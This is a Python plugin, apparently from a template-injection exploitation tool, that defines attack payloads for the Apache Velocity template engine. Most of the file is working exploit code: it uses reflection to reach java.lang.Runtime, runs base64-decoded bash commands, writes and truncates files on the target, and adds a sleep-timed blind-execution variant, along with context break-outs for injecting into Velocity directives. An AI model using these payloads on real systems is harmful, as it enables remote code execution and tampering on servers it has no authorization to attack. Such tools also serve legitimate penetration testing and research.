from utils.loggers import log
from plugins.languages import java
from utils import rand
from utils.strings import quote
import re

class Velocity(java.Java):
    
    def init(self):

        self.update_actions({
            'render' : {
                'render': '%(code)s',
                'header': '\n#set($h=%(header)s)\n${h}\n',
                'trailer': '\n#set($t=%(trailer)s)\n${t}\n',
                'test_render': '#set($c=%(n1)s*%(n2)s)\n${c}\n' % { 
                    'n1' : rand.randints[0], 
                    'n2' : rand.randints[1]
                },
                'test_render_expected': '%(res)s' % { 
                    'res' : rand.randints[0]*rand.randints[1] 
                }
            },
            'write' : {
                'call' : 'inject',
                'write' : """#set($engine="")
#set($run=$engine.getClass().forName("java.lang.Runtime"))
#set($runtime=$run.getRuntime())
#set($proc=$runtime.exec("bash -c {tr,_-,/+}<<<%(chunk_b64)s|{base64,--decode}>>%(path)s"))
#set($null=$proc.waitFor())
#set($istr=$proc.getInputStream())
#set($chr=$engine.getClass().forName("java.lang.Character"))
#set($output="")
#set($string=$engine.getClass().forName("java.lang.String"))
#foreach($i in [1..$istr.available()])
#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))
#end
${output}
""",
                'truncate' : """#set($engine="")
#set($run=$engine.getClass().forName("java.lang.Runtime"))
#set($runtime=$run.getRuntime())
#set($proc=$runtime.exec("bash -c {echo,-n,}>%(path)s"))
#set($null=$proc.waitFor())
#set($istr=$proc.getInputStream())
#set($chr=$engine.getClass().forName("java.lang.Character"))
#set($output="")
#set($string=$engine.getClass().forName("java.lang.String"))
#foreach($i in [1..$istr.available()])
#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))
#end
${output}
"""
            },
            'execute' : {

               # This payload cames from henshin's contribution on 
               # issue #9.

                'call': 'render',
                'execute': """#set($engine="")
#set($run=$engine.getClass().forName("java.lang.Runtime"))
#set($runtime=$run.getRuntime())
#set($proc=$runtime.exec("bash -c {eval,$({tr,/+,_-}<<<%(code_b64)s|{base64,--decode})}"))
#set($null=$proc.waitFor())
#set($istr=$proc.getInputStream())
#set($chr=$engine.getClass().forName("java.lang.Character"))
#set($output="")
#set($string=$engine.getClass().forName("java.lang.String"))
#foreach($i in [1..$istr.available()])
#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))
#end
${output}
""" 
            },
            'execute_blind' : {
                'call': 'inject',
                'execute_blind': """#set($engine="")
#set($run=$engine.getClass().forName("java.lang.Runtime"))
#set($runtime=$run.getRuntime())
#set($proc=$runtime.exec("bash -c {eval,$({tr,/+,_-}<<<%(code_b64)s|{base64,--decode})}&&{sleep,%(delay)s}"))
#set($null=$proc.waitFor())
#set($istr=$proc.getInputStream())
#set($chr=$engine.getClass().forName("java.lang.Character"))
#set($output="")
#set($string=$engine.getClass().forName("java.lang.String"))
#foreach($i in [1..$istr.available()])
#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))
#end
${output}
"""
            }
        })

        self.set_contexts([

                # Text context, no closures
                { 'level': 0 },

                { 'level': 1, 'prefix': '%(closure)s)', 'suffix' : '', 'closures' : java.ctx_closures },

                # This catches
                # #if(%s == 1)\n#end
                # #foreach($item in %s)\n#end
                # #define( %s )a#end
                { 'level': 3, 'prefix': '%(closure)s#end#if(1==1)', 'suffix' : '', 'closures' : java.ctx_closures },
                { 'level': 5, 'prefix': '*#', 'suffix' : '#*' },

        ])